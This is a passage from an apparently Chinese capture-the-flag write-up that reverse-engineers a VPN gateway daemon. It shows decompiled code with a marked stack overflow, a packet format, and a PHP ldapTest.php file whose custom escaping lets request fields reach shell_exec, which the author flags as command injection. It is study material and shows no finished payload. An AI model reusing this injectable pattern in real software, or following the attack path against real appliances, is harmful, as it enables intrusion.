        <span class="n">v17</span> <span class="o">=</span> <span class="n">SET_REDIRECT</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">a7</span><span class="p">);</span>            <span class="c1">// 重定向信息命令 栈溢出漏洞</span>
        <span class="n">syslog</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"%lx MAJOR_COMMAND_SET_REDIRECT_INFO socket... %d"</span><span class="p">,</span> <span class="n">v13</span><span class="p">,</span> <span class="o">*</span><span class="n">a7</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">v17</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">6</span><span class="o">:</span>
        <span class="n">syslog</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"%lx MAJOR_COMMAND_VPN_AUTH"</span><span class="p">,</span> <span class="n">v13</span><span class="p">);</span>
        <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">VPN_AUTH</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a4</span><span class="p">,</span> <span class="n">a5</span><span class="p">,</span> <span class="n">a6</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span><span class="c1">// VPN 认证</span>
      <span class="k">case</span> <span class="mi">7</span><span class="o">:</span>
        <span class="n">syslog</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"%lx MINOR_COMMAND_GET_VERSION"</span><span class="p">,</span> <span class="n">v13</span><span class="p">);</span><span class="c1">// 获取版本</span>
        <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">GET_VERSION</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>
      <span class="k">default</span><span class="o">:</span>
        <span class="n">syslog</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"%lx unknown command..."</span><span class="p">,</span> <span class="n">v13</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">LABEL_29</span><span class="p">;</span>
    <span class="p">}</span>
</pre></div>
<p>上面是功能菜单，通过逆向，大概确定其发送的信息格式如下</p>
<pre><code>b'SlSp' + p32(data_size) + p8(version) + p8(VPN_auth_flag) + b'b'*10 + p16(opt) + p16(opt7_flag) + p32(ip)</code></pre>
<p>其中 5 功能存在栈溢出漏洞</p>
<div class="highlight"><pre><span></span><span class="n">v5</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="sc">':'</span><span class="p">);</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">!=</span> <span class="n">v4</span> <span class="p">)</span>
      <span class="n">memcpy</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="n">v5</span> <span class="o">-</span> <span class="n">v4</span><span class="p">);</span> <span class="c1">// 栈溢出</span>
    <span class="n">syslog</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"redirect host %s"</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">host</span><span class="p">);</span>
    <span class="n">port</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="n">v6</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
    <span class="n">syslog</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"redirect port %d"</span><span class="p">,</span> <span class="n">port</span><span class="p">);</span>
    <span class="n">v8</span> <span class="o">=</span> <span class="n">proxy_connect</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">qword_234C8</span><span class="p">);</span>
    <span class="o">*</span><span class="n">a2</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
    <span class="n">syslog</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"redirect socket %d"</span><span class="p">,</span> <span class="n">v8</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">3LL</span><span class="p">;</span>
  <span class="p">}</span>
</pre></div>
<p>但是无法泄露内存地址无法进行正常攻击<br/>
锁定</p>
<h3 data-content="1" id="9510d4eb978beed0448e9d8c318decc9">密钥和证书用于联通VPN隧道</h3>
<p>可以在日志里面找到:</p>
<div class="highlight"><pre><span></span><span class="p">...</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">07</span><span class="p">:</span><span class="mi">41</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">4030</span><span class="p">]:</span> <span class="n">listen_port</span> <span class="p">:</span> <span class="mi">45443</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">07</span><span class="p">:</span><span class="mi">41</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">4030</span><span class="p">]:</span> <span class="n">private_key_path</span> <span class="p">:</span> <span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">ssl</span><span class="p">/</span><span class="k">private</span><span class="p">/</span><span class="n">ssgw_ssl</span><span class="p">.</span><span class="n">key</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">07</span><span class="p">:</span><span class="mi">41</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">4030</span><span class="p">]:</span> <span class="n">server_cert_path</span> <span class="p">:</span> <span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">ssl</span><span class="p">/</span><span class="n">certs</span><span class="p">/</span><span class="n">ssgw_cert</span><span class="p">.</span><span class="n">pem</span>
<span class="p">...</span>
</pre></div>
<h2 data-content="1" id="c5432a5edf26f09508f4730066e974d3">开始Web渗透</h2>
<h3 data-content="1" id="11d2caacade991b02a2f7b594e061abb">发现连接vpn后可以访问80端口的web服务</h3>
<p>但是后面发现 5 功能是 VPN 的连接功能，可以连接到靶机中只有本地开放的端口</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241210135623-7c61f2bc-b6bb-1.png"/></p>
<h3 data-content="1" id="53def95e4b7f1ab3defb3b2e84f202e6">发现存在命令注入漏洞在php</h3>
<p>发现开放了端口,可以找到这个php文件,存在漏洞!</p>
<div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@box</span><span class="p">:/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="err">#</span> <span class="n">find</span> <span class="p">/</span> <span class="p">-</span><span class="n">name</span> <span class="n">ldapTest</span><span class="p">.</span><span class="n">php</span>

<span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">www</span><span class="p">/</span><span class="n">html</span><span class="p">/</span><span class="n">ldapTest</span><span class="p">.</span><span class="n">php</span>
<span class="n">root</span><span class="nd">@box</span><span class="p">:/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="err">#</span> <span class="n">cat</span> <span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">www</span><span class="p">/</span><span class="n">html</span><span class="p">/</span><span class="n">ldapTest</span><span class="p">.</span><span class="n">php</span>
<span class="p">&lt;?</span><span class="n">php</span>

<span class="k">function</span> <span class="n">getSchemaDN</span><span class="p">($</span><span class="n">uri</span><span class="p">,$</span><span class="n">tls</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">$</span><span class="n">cmd</span> <span class="p">=</span> <span class="n">sprintf</span><span class="p">(</span><span class="s">" ldapsearch -x -LLL -o ldif-wrap=no -H %s %s -s base subschemaSubentry"</span><span class="p">,$</span><span class="n">uri</span><span class="p">,$</span><span class="n">tls</span><span class="p">);</span>
    <span class="p">$</span><span class="n">ldap_search</span> <span class="p">=</span> <span class="n">shell_exec</span><span class="p">($</span><span class="n">cmd</span><span class="p">);</span>
    <span class="n">preg_match</span><span class="p">(</span><span class="err">'</span><span class="p">/</span><span class="n">subschemaSubentry</span><span class="p">:</span><span class="err">\</span><span class="n">s</span><span class="p">*(.*)/</span><span class="err">'</span><span class="p">,</span> <span class="p">$</span><span class="n">ldap_search</span><span class="p">,</span> <span class="p">$</span><span class="n">match</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">count</span><span class="p">($</span><span class="n">match</span><span class="p">)</span> <span class="p">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">trim</span><span class="p">($</span><span class="n">match</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>而本地 80 则开放了一个端口服务，其中的 ldapTest.php 存在命令执行漏洞</p>
<p>代码：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">function</span> <span class="nf">getSchemaDN</span><span class="p">(</span><span class="nv">$uri</span><span class="p">,</span><span class="nv">$tls</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">" ldapsearch -x -LLL -o ldif-wrap=no -H %s %s -s base subschemaSubentry"</span><span class="p">,</span><span class="nv">$uri</span><span class="p">,</span><span class="nv">$tls</span><span class="p">);</span>
    <span class="nv">$ldap_search</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
    <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/subschemaSubentry:\s*(.*)/'</span><span class="p">,</span> <span class="nv">$ldap_search</span><span class="p">,</span> <span class="nv">$match</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$match</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">isAttrExists</span><span class="p">(</span><span class="nv">$attr</span><span class="p">,</span><span class="nv">$uri</span><span class="p">,</span><span class="nv">$tls</span><span class="p">,</span><span class="nv">$base</span><span class="p">,</span><span class="nv">$user</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">"ldapsearch -o ldif-wrap=no -H %s %s -x -D %s -b </span><span class="se">\"</span><span class="s2">%s</span><span class="se">\"</span><span class="s2"> -w %s -s base -a always </span><span class="se">\"</span><span class="s2">(objectClass=*)</span><span class="se">\"</span><span class="s2"> </span><span class="se">\"</span><span class="s2">attributeTypes</span><span class="se">\"</span><span class="s2">"</span><span class="p">,</span><span class="nv">$uri</span><span class="p">,</span><span class="nv">$tls</span><span class="p">,</span><span class="nv">$user</span><span class="p">,</span><span class="nv">$base</span><span class="p">,</span><span class="nv">$pass</span><span class="p">);</span>
    <span class="nv">$ldap_search</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
    <span class="nv">$attr_string_array</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">")"</span><span class="p">,</span><span class="nv">$ldap_search</span><span class="p">);</span>
    <span class="nv">$attr_array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$attr_string_array</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/attributeTypes:.*NAME \(?\s?\'(.*?)\'.*/'</span><span class="p">,</span> <span class="nv">$val</span><span class="p">,</span> <span class="nv">$match</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$match</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="nb">strcasecmp</span><span class="p">(</span><span class="nv">$attr</span><span class="p">,</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">getPassword</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$password</span> <span class="o">==</span> <span class="s2">""</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s2">""</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nv">$password</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">escapeshellarg_jp</span><span class="p">(</span><span class="nv">$p_arg</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$escape_flg</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/^'(.*)'$/"</span><span class="p">,</span> <span class="nv">$p_arg</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">)</span> <span class="o">===</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$p_arg</span> <span class="o">=</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="nv">$offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span><span class="o">++</span><span class="nv">$offset</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$p_arg</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$char1byte</span> <span class="o">=</span> <span class="nv">$p_arg</span><span class="p">[</span><span class="nv">$offset</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$escape_flg</span> <span class="o">==</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nv">$char1byte</span> <span class="o">==</span> <span class="s2">"</span><span class="se">\\</span><span class="s2">"</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$escape_flg</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$escape_flg</span> <span class="o">==</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nv">$char1byte</span> <span class="o">==</span> <span class="s2">"'"</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$p_arg</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$p_arg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$offset</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\\</span><span class="s2">"</span> <span class="o">.</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$p_arg</span><span class="p">,</span> <span class="nv">$offset</span><span class="p">);</span>
            <span class="nv">$escape_flg</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="nv">$escape_flg</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$escape_flg</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nv">$p_arg</span> <span class="o">.=</span> <span class="p">(</span><span class="nv">$escape_flg</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span> <span class="o">?</span> <span class="s2">"</span><span class="se">\\</span><span class="s2">"</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
    <span class="nv">$p_arg</span>  <span class="o">=</span> <span class="s2">"'</span><span class="si">$p_arg</span><span class="s2">'"</span><span class="p">;</span>

    <span class="k">return</span> <span class="nv">$p_arg</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">getResultMessage</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$result_array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$result_array</span><span class="p">[</span><span class="s2">"code"</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
        <span class="nv">$result_array</span><span class="p">[</span><span class="s2">"message"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"&lt;label class=</span><span class="se">\"</span><span class="s2">err_msg</span><span class="se">\"</span><span class="s2">&gt;"</span> <span class="o">.</span> <span class="nx">__</span><span class="p">(</span><span class="s2">"Ldap_Server_Auth_Failed_Item"</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"&lt;/label&gt;&lt;br/&gt;"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="s1">'result: 0 Success'</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$result_array</span><span class="p">[</span><span class="s2">"code"</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
        <span class="nv">$result_array</span><span class="p">[</span><span class="s2">"message"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"&lt;label class=</span><span class="se">\"</span><span class="s2">err_msg</span><span class="se">\"</span><span class="s2">&gt;"</span> <span class="o">.</span> <span class="nx">__</span><span class="p">(</span><span class="s2">"Inavlid_Search_Condition_Item"</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"&lt;/label&gt;&lt;br/&gt;"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="s1">'# numEntries: '</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$result_array</span><span class="p">[</span><span class="s2">"code"</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
        <span class="nv">$result_array</span><span class="p">[</span><span class="s2">"message"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"&lt;label class=</span><span class="se">\"</span><span class="s2">err_msg</span><span class="se">\"</span><span class="s2">&gt;"</span> <span class="o">.</span> <span class="nx">__</span><span class="p">(</span><span class="s2">"Ldap_User_Not_Found_Item"</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"&lt;/label&gt;&lt;br/&gt;"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$result_array</span><span class="p">[</span><span class="s2">"code"</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$result_array</span><span class="p">[</span><span class="s2">"message"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"&lt;label class=</span><span class="se">\"</span><span class="s2">attention</span><span class="se">\"</span><span class="s2">&gt;"</span> <span class="o">.</span> <span class="nx">__</span><span class="p">(</span><span class="s2">"Ldap_Test_Success_Item"</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"&lt;/label&gt;&lt;br/&gt;"</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nv">$result_array</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$request</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"myData"</span><span class="p">]);</span>
<span class="nv">$response</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">foreach</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">servers</span> <span class="k">as</span> <span class="nv">$server</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$server</span><span class="o">-&gt;</span><span class="na">host</span> <span class="o">!=</span> <span class="s2">""</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$url</span> <span class="o">=</span> <span class="nb">escapeshellarg</span><span class="p">((</span><span class="nv">$server</span><span class="o">-&gt;</span><span class="na">tls</span> <span class="o">==</span> <span class="k">true</span> <span class="o">?</span> <span class="s2">"ldaps"</span> <span class="o">:</span> <span class="s2">"ldap"</span><span class="p">)</span> <span class="o">.</span><span class="s2">"://</span><span class="si">$server-&gt;host</span><span class="s2">:</span><span class="si">$server-&gt;port</span><span class="s2">"</span><span class="p">);</span>
        <span class="nv">$ldap_test_filter</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"%s"</span><span class="p">,</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">target</span><span class="p">,</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">filter</span><span class="p">);</span>

        <span class="nv">$dn</span> <span class="o">=</span> <span class="nx">escapeshellarg_jp</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">dn</span><span class="p">);</span>
        <span class="nv">$password</span> <span class="o">=</span> <span class="nx">escapeshellarg_jp</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">);</span>
        <span class="nv">$base</span> <span class="o">=</span> <span class="nx">escapeshellarg_jp</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">base</span><span class="p">);</span>
        <span class="nv">$filter</span> <span class="o">=</span> <span class="nx">escapeshellarg_jp</span><span class="p">(</span><span class="nv">$ldap_test_filter</span><span class="p">);</span>
        <span class="nv">$subtree</span> <span class="o">=</span> <span class="nx">escapeshellarg_jp</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">subtree</span><span class="p">);</span>
        <span class="nv">$attr</span> <span class="o">=</span> <span class="nx">escapeshellarg_jp</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">target_attr</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">==</span> <span class="s2">""</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$password</span> <span class="o">=</span> <span class="nx">escapeshellarg_jp</span><span class="p">(</span><span class="nx">getPassword</span><span class="p">());</span>
        <span class="p">}</span>

        <span class="nv">$ldap_search</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"ldapsearch -A -x -H </span><span class="si">$url</span><span class="s2"> "</span> <span class="o">.</span><span class="p">(</span><span class="nv">$server</span><span class="o">-&gt;</span><span class="na">tls</span> <span class="o">==</span> <span class="k">true</span> <span class="o">?</span> <span class="s2">"-Z "</span> <span class="o">:</span> <span class="s2">""</span><span class="p">)</span><span class="o">.</span> <span class="s2">"-D </span><span class="si">$dn</span><span class="s2"> -w </span><span class="si">$password</span><span class="s2"> -b </span><span class="si">$base</span><span class="s2"> -s </span><span class="si">$subtree</span><span class="s2"> </span><span class="si">$filter</span><span class="s2">"</span><span class="p">);</span>
        <span class="nv">$response</span><span class="p">[</span><span class="nv">$index</span><span class="p">]</span> <span class="o">=</span> <span class="nx">getResultMessage</span><span class="p">(</span><span class="nv">$ldap_search</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$response</span><span class="p">[</span><span class="nv">$index</span><span class="p">][</span><span class="s2">"code"</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$schema</span> <span class="o">=</span> <span class="nx">getSchemaDN</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span><span class="nv">$server</span><span class="o">-&gt;</span><span class="na">tls</span> <span class="o">==</span> <span class="k">true</span> <span class="o">?</span> <span class="s2">"-Z "</span> <span class="o">:</span> <span class="s2">""</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$schema</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$response</span><span class="p">[</span><span class="nv">$index</span><span class="p">][</span><span class="s2">"code"</span><span class="p">]</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
                <span class="nv">$response</span><span class="p">[</span><span class="nv">$index</span><span class="p">][</span><span class="s2">"message"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"&lt;label class=</span><span class="se">\"</span><span class="s2">err_msg</span><span class="se">\"</span><span class="s2">&gt;"</span> <span class="o">.</span> <span class="nx">__</span><span class="p">(</span><span class="s2">"Ldap_Check_Attr_Failed_Item"</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"&lt;/label&gt;&lt;br/&gt;"</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$found</span> <span class="o">=</span> <span class="nx">isAttrExists</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">target_attr</span><span class="p">,</span><span class="nv">$url</span><span class="p">,</span><span class="nv">$server</span><span class="o">-&gt;</span><span class="na">tls</span> <span class="o">==</span> <span class="k">true</span> <span class="o">?</span> <span class="s2">"-Z "</span> <span class="o">:</span> <span class="s2">""</span><span class="p">,</span><span class="nv">$schema</span><span class="p">,</span><span class="nv">$dn</span><span class="p">,</span><span class="nv">$password</span><span class="p">);</span> <span class="c1">// for OpenLDAP</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$found</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$response</span><span class="p">[</span><span class="nv">$index</span><span class="p">][</span><span class="s2">"code"</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                    <span class="nv">$response</span><span class="p">[</span><span class="nv">$index</span><span class="p">][</span><span class="s2">"message"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"&lt;label class=</span><span class="se">\"</span><span class="s2">err_msg</span><span class="se">\"</span><span class="s2">&gt;"</span> <span class="o">.</span> <span class="nx">__</span><span class="p">(</span><span class="s2">"Ldap_Attr_Not_Found_Item"</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"&lt;/label&gt;&lt;br/&gt;"</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nv">$index</span><span class="o">++</span><span class="p">;</span>
<span class="p">}</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/json'</span><span class="p">);</span>
<span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$response</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>漏洞点：</p>
<div class="highlight"><pre><span></span><span class="x">$request = json_decode($_POST["myData"]);</span>
<span class="x">$response = array();</span>
<span class="x">$index = 0;</span>
<span class="x">echo "foreash\n";</span>
<span class="x">echo "foreash".$request;</span>
<span class="x">foreach($request-&gt;servers as $server) {</span>
<span class="x">    echo "server-host\n";</span>
<span class="x">    echo $server-&gt;host;</span>
<span class="x">    if($server-&gt;host != "") {</span>
<span class="x">        $url = escapeshellarg(($server-&gt;tls == true ? "ldaps" : "ldap") ."://$server-&gt;host:$server-&gt;port");</span>
<span class="x">        $ldap_test_filter = str_replace("%s", $request-&gt;target, $request-&gt;filter);</span>

<span class="x">        $dn = escapeshellarg_jp($request-&gt;dn);</span>
<span class="x">        $password = escapeshellarg_jp($request-&gt;password);</span>
<span class="x">        $base = escapeshellarg_jp($request-&gt;base);</span>
<span class="x">        $filter = escapeshellarg_jp($ldap_test_filter);</span>
<span class="x">        $subtree = escapeshellarg_jp($request-&gt;subtree);</span>
<span class="x">        $attr = escapeshellarg_jp($request-&gt;target_attr);</span>
<span class="x">        if($request-&gt;password == "") {</span>
<span class="x">            $password = escapeshellarg_jp(getPassword());</span>
<span class="x">        }</span>

<span class="x">        $ldap_search = shell_exec("ldapsearch -A -x -H $url " .($server-&gt;tls == true ? "-Z " : ""). "-D $dn -w $password -b $base -s $subtree $filter");</span>
<span class="x">        $response[$index] = getResultMessage($ldap_search);</span>
<span class="x">        if($response[$index]["code"] == 0) {</span>
<span class="x">            $schema = getSchemaDN($url,$server-&gt;tls == true ? "-Z " : "");</span>
<span class="x">            if(!$schema) {</span>
<span class="x">                $response[$index]["code"] = 5;</span>
